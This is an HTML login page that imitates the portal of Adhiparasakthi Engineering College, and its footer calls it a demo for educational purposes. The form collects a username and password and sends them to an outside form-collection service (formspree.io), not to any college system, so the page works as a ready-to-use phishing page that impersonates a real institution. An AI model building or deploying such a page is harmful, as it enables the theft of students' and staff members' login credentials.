<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Adhiparasakthi Engineering College - Demo Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:linear-gradient(135deg,#0052D4,#4364F7,#6FB1FC);
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.login-box{
    width:360px;
    background:#fff;
    padding:30px;
    border-radius:15px;
    text-align:center;
    box-shadow:0 10px 30px rgba(0,0,0,.3);
}

.logo{
    width:110px;
    height:110px;
    object-fit:contain;
    margin-bottom:15px;
}

h2{
    color:#003366;
    margin-bottom:5px;
}

p{
    color:#666;
    margin-bottom:20px;
}

.input-box{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    background:#003366;
    color:white;
    border:none;
    border-radius:8px;
    font-size:17px;
    cursor:pointer;
    margin-top:10px;
}

button:hover{
    background:#0055aa;
}

.footer{
    margin-top:15px;
    font-size:13px;
    color:gray;
}
</style>

</head>

<body>

<div class="login-box">

    <!-- Upload your logo as logo.png -->
    
    

    <h2>Adhiparasakthi Engineering College</h2>

    <p>Demo Login Portal</p>

    <form action="https://formspree.io/f/meebpwvw" method="POST">

        <input
            class="input-box"
            type="text"
            name="Username"
            placeholder="Enter Username"
            required>

        <input
            class="input-box"
            type="password"
            name="Password"
            placeholder="Enter Password"
            required>

        <button type="submit">
            Login
        </button>

    </form>

    <div class="footer">
        Demo project for educational purposes.
    </div>

</div>

</body>
</html>
